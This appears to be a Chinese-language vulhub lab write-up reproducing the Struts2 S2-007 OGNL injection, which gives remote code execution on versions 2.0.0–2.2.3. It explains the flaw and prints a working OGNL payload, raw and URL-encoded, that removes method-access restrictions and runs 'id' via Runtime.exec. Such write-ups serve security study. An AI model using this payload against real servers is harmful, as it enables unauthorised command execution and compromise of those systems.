# Struts2_007_远程代码执行

###### by ADummy

### 0x00利用路线

​			burpuite抓包--->修改payload--->重放包--->代码执行

### 0x01漏洞介绍

​			当`<ActionName> -validation.xml`配置的验证规则。如果类型验证转换失败，则服务器将拼接用户提交的表单值字符串，然后执行OGNL表达式解析并返回，造成OGNL表达式注入。从而可能造成远程执行代码。

​			当用户`age`以`str`而不是的形式提交时`int`，服务器将拼接`"'" + value + "'"`代码，然后使用OGNL表达式对其进行解析。为了成功完成任务，我们需要找到一个配置有相似验证规则的表单字段，以产生转换错误。然后，您可以通过注入SQL单引号的方式注入任何OGNL表达式代码

​			影响版本

  		2.0.0 - 2.2.3

### 0x02漏洞复现

#### payload：

' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())) + '

url编码：

%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%29+%2B+%27

​			登录界面

![S2_007_rce_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_007_rce_1.jpg)

​			Burpsuite抓包，发送第一个payload

![S2_007_rce_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_007_rce_2.jpg)

​			有回显，id被执行。

![S2_007_rce_3](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/S2_007_rce_3.jpg)



### 0x03参考资料

https://xz.aliyun.com/t/2684

https://blog.csdn.net/qq_45625605/article/details/103085867